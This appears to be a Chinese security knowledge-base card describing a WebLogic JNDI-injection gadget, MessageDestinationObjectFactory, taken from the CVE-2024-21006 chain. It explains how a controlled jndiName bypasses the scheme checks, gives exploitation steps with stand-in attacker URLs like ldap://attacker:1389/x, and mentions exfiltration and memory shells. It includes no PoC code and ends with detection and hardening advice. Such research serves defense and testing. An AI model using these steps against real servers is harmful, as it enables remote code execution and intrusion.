---
id: web-java-deserialization-jndi-weblogic-messagedestinationobjectfactory-local-lookup
title: WebLogic MessageDestinationObjectFactory 本地工厂：Reference 的 jndiName 被 lookupMessageDestination 直接 InitialContext.lookup（JNDI 二次注入 gadget）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: jndi-weblogic-messagedestinationobjectfactory-second-lookup
aliases:
- MessageDestinationObjectFactory
- MessageDestinationReference
- lookupMessageDestination
- WebLogic 本地工厂 JNDI 注入
- JNDI 二次注入 gadget
- weblogic.application.naming
tags:
- java
- jndi
- jndi-injection
- weblogic
- objectfactory
- local-factory
- reference
- gadget
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V461
  verified_at: '2026-11-10T14:24:53+08:00'
  notes: 已对照原文与 12 张图片核对：MessageDestinationObjectFactory.getObjectInstance 仅断言 MessageDestinationReference 后调用 lookupMessageDestination、initialContextFactory 为空直接 new InitialContext().lookup(jndiName)、非空时 providerURL 需 RequestSigner 验签、jndiName 为引用实例属性可控且不在 URL scheme 校验采集范围，均与源码截图一致；该卡为 CVE-2024-21006 链中抽出的可复用本地工厂 gadget，与 CVE 链卡分工不同（通用 gadget vs CVE 场景），保留并列；原文无独立 PoC，卡内已标注“无 PoC”。未验证点：未独立复现该 gadget。dup-scan 早于建卡且无本篇 pair；dedup 候选 ViburDBCP/c3p0/Tomcat 工厂均为不同类，判定 new 成立。
---

## 一句话结论

WebLogic classpath 自带的本地 `ObjectFactory` `weblogic.application.naming.MessageDestinationObjectFactory` 在 `getObjectInstance` 中只检查传入对象是 `MessageDestinationReference`，随后调用其 `lookupMessageDestination()`；该方法直接拿引用对象内的 `jndiName` 执行 `InitialContext.lookup()`，因此任何能把攻击者可控的 `Reference` 送进 `NamingManager.getObjectInstance` 的入口（如 WebLogic IIOP 命名服务上的续接解析，或其它可注入 Reference 的反序列化/命名入口），都能借它把一次对象工厂解析变成 JNDI 注入。

## 原理

- **工厂被谁调用**：`NamingManager.getObjectInstance(refInfo, name, nameCtx, env)` 在 `refInfo` 为 `Reference` 或 `Referenceable` 时取出 `ref`，按 `ref.getFactoryClassName()` 通过 `getObjectFactoryFromReference` 加载工厂：先在本机 classpath `loadClass(factoryName)`，本地失败且 `factoryClassLocation` 非空才走远程 codebase；成功后 `newInstance()` 并调用 `factory.getObjectInstance(ref, name, nameCtx, env)`。也就是说，只要引用里的工厂类名指向 WebLogic 自带的 `MessageDestinationObjectFactory`，解析就会落到该类上，不依赖远程类加载。
- **工厂的校验极弱**：`MessageDestinationObjectFactory#getObjectInstance` 只判断 `obj instanceof MessageDestinationReference`（不满足则 `AssertionError`），满足时直接 `return ((MessageDestinationReference) obj).lookupMessageDestination();`——不做来源、目标地址或签名相关的检查。
- **真正的 sink**：`lookupMessageDestination()` 分两条路径：`initialContextFactory` 为空时直接 `new InitialContext()`，随后 `return ic.lookup(this.jndiName)`；`initialContextFactory` 非空时把 `java.naming.factory.initial` 与 `java.naming.provider.url` 放入环境，providerURL 非空时还要求 `RequestSigner` 对 `signature`/`timestamp` 验签（失败抛 `NamingException`），然后 `new InitialContext(env).lookup(this.jndiName)`。`jndiName` 是引用对象的实例属性、完全由构造引用的一方控制，填 `ldap://`/`rmi://` 等完整 URL 即触发 JNDI 注入。
- **为什么能绕过 Reference URL 校验**：WebLogic 在 `JNDIUtils.isValidReferenceObject`/`isValidJndiScheme` 中只对引用元数据里的 URL（`factoryClassLocation` 与类型为 `URL` 的 `StringRefAddr`）做 scheme 白名单校验（`jndiAllowScheme`，默认空即全部拒绝远程 scheme）。本 gadget 的控制点是被解析对象里的 JavaBean 属性 `jndiName`，它不在校验采集范围内；校验放过引用后，真正的 lookup 发生在本地工厂内部，属于“二次”JNDI 解析，所以“工厂类名本地 + 远程 URL 只出现在 jndiName 字段”的组合可以通过校验并触发注入。
- **代码观察到的边界**：从所给源码看，当 `initialContextFactory` 非空且 `providerURL` 非空时会强制 `RequestSigner` 验签，缺少合法签名/时间戳无法走该分支；而 `initialContextFactory` 为空时直接 `new InitialContext()`，没有这段验签逻辑（默认环境由 JVM/容器决定）。利用时按目标环境选择能走通的字段组合。

## 触发条件

- 目标 classpath 含 WebLogic 标准类 `weblogic.application.naming.MessageDestinationObjectFactory` 与 `MessageDestinationReference`（WebLogic 自带，无需额外依赖）。
- 存在能把攻击者可控的 `MessageDestinationReference`（或其等价引用，factory 指向该工厂）作为 lookup 结果交给 `NamingManager.getObjectInstance` 的入口，例如 WebLogic IIOP 命名服务的复合名/续接解析（CVE-2024-21006 场景），或其它允许注入 `Reference` 的反序列化/命名入口。
- `jndiName` 可控且指向可用的 JNDI 注入目标；目标能出网到攻击者控制的 LDAP/RMI 服务（或能衔接本地工厂/JDBC 等不出网链）。
- 若使用 `initialContextFactory`/`providerURL` 分支，需要能通过 `RequestSigner` 验签，否则应选空工厂分支。
- 仅限授权测试。

## 利用步骤

1. 构造 `MessageDestinationReference`：把 `jndiName` 设为恶意 JNDI URL（如 `ldap://attacker:1389/x`、`rmi://attacker:1099/x`），工厂类名指向 `weblogic.application.naming.MessageDestinationObjectFactory`；`classFactoryLocation` 留空、避免 URL 类型 `RefAddr`，以通过 Reference 侧的 scheme 校验。
2. 通过目标入口把该引用送入 JNDI 解析：在 IIOP 命名服务场景下，先绑定引用，再用带分隔符的复合名 lookup 触发续接上下文解析；在反序列化入口场景下，让反序列化/`lookup` 的对象图最终以该引用作为 `refInfo`。
3. `NamingManager.getObjectInstance` 本地加载 `MessageDestinationObjectFactory`，其 `getObjectInstance` 调用 `lookupMessageDestination()`，对 `jndiName` 执行 `InitialContext.lookup`。
4. 在攻击者 LDAP/RMI 服务上按目标 JDK 版本返回远程 codebase 类或本地工厂利用数据，完成命令执行；无回显时用 DNS/HTTP 外带或内存马。
5. 若目标 JDK 禁止远程类加载，改用高版本 JNDI 本地工厂/JDBC 链把 `jndiName` 指向相应服务。

## PoC

无 PoC（原文未给出该工厂的独立构造/发送代码，仅在 CVE-2024-21006 的调用链中展示了其 `getObjectInstance` 与 `lookupMessageDestination` 源码；上述字段组合按源码推导）。

## 变体与关联

- **入口变体**：只要能控制传入 `NamingManager.getObjectInstance` 的 `Reference` 及 `factoryClassName`，本工厂就可用；IIOP 命名服务续接解析只是其中一种入口，其它反序列化/命名注入面同样成立。
- **字段变体**：`initialContextFactory` 为空走默认 `InitialContext`；非空时可用自定义 `java.naming.factory.initial`（如 LDAP/RMI 的 URL context factory）配合 `jndiName` 控制解析器，但 `providerURL` 非空会触发 `RequestSigner` 验签约束。
- **同类 gadget**：与 Tomcat `ResourceFactory`/`LookupFactory` 的本地工厂二次加载、c3p0 `JavaBeanObjectFactory`、Tomcat `BeanFactory` 等同属“引用驱动本地 ObjectFactory 产生副作用”的家族。
- **关联**：[[web-java-component-weblogic-cve-2024-21006-iiop-lookupsharable-messagedestination-jndi]]（本 gadget 在 IIOP 命名服务链中的完整 CVE 场景）、[[web-java-deserialization-jndi-tomcat-resourcefactory-factory-refaddr-second-injection]]（Reference 属性驱动的二次工厂加载）、[[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]（本地工厂 sink）、[[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]（高版本 JNDI 本地工厂基线）。

## 检测与防御

- **JNDI 加固**：用 `ObjectFactoriesFilter`/`jdk.jndi.object.factoriesFilter` 拒绝外部引用实例化 `weblogic.application.naming.MessageDestinationObjectFactory`；业务不使用 JMS Message Destination 命名时禁用相关能力。
- **入口收敛**：关闭或限制 IIOP/T3 命名服务；禁止不可信来源的 `Reference`/`Referenceable` 进入 `NamingManager.getObjectInstance`；对反序列化入口启用 JEP 290 过滤。
- **流量检测**：命名请求或序列化数据中出现 `MessageDestinationReference`、factory 指向 `MessageDestinationObjectFactory`、`jndiName` 为外部 `ldap://`/`rmi://` 是强特征；随后 JVM 对外发起 JNDI 连接、DNS 查询或加载远程类同样可疑。
- **日志与应急**：关注 `lookupMessageDestination`、`InitialContext.lookup` 指向外部地址的异常栈；发现利用迹象时隔离实例，检查出网连接与异常子进程并确认补丁状态。
